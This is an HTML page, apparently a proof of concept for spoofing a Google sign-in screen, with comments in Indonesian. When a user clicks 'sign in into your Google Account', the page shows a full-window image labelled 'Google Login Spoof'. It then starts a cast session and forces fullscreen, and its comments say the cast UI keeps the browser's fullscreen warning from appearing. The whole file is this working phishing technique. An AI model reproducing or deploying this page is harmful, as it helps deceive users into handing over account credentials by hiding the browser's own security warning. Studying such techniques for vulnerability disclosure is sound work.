<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, user-scalable=no" />
  <title>URL TESTING WEBVIEW</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      overflow: hidden;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #spoof-img {
      display: none;
      max-width: 100%;
      max-height: 100%;
      object-fit: cover;
      position: absolute;
      top: 0;
      left: 0;
      z-index: 1;
    }
    .signin-link {
      padding: 20px 40px;
      background: #4285f4;
      color: white;
      font-size: 18px;
      text-decoration: none;
      border-radius: 4px;
      cursor: pointer;
      z-index: 10;
      position: relative;
    }
  </style>
  <script>
    function goFullscreen() {
      var elem = document.documentElement;
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.webkitRequestFullscreen) {
        elem.webkitRequestFullscreen();
      } else if (elem.mozRequestFullScreen) {
        elem.mozRequestFullScreen();
      } else if (elem.msRequestFullscreen) {
        elem.msRequestFullscreen();
      }
    }

    let presentationRequest;
    let presentationConnection = null;

    function startCastFlow() {
      // 1. Tampilkan spoof.png langsung
      document.getElementById("spoof-img").style.display = "block";

      // 2. Sembunyikan tombol setelah 1 detik
      setTimeout(() => {
        document.querySelector(".signin-link").style.display = "none";
      }, 1000);

      // 3. Buat PresentationRequest ke receiver (ganti dengan file kamu)
      presentationRequest = new PresentationRequest(["opener.html"]); // atau receiver.html

      // Jadikan default untuk menu Cast browser
      navigator.presentation.defaultRequest = presentationRequest;

      // 4. Mulai Cast — ini akan munculkan dialog pilih device
      presentationRequest.start()
        .then(connection => {
          presentationConnection = connection;
          console.log("Cast berhasil: ", connection.id);

          // 5. Setelah Cast aktif → langsung trigger fullscreen main window
          // Cast UI aktif = toast fullscreen sering tidak muncul
          goFullscreen();
        })
        .catch(error => {
          console.error("Cast gagal: ", error);
          // Jika Cast gagal (tidak ada device), tetap fullscreen sebagai fallback
          goFullscreen();
        });
    }
  </script>
</head>
<body>
  <!-- Tombol utama -->
  <a href="#" class="signin-link" onclick="startCastFlow(); return false;">
    Click here to sign in into your Google Account
  </a>

  <!-- Background spoof -->
  <img id="spoof-img" src="spoof.png" alt="Google Login Spoof" />
</body>
</html>
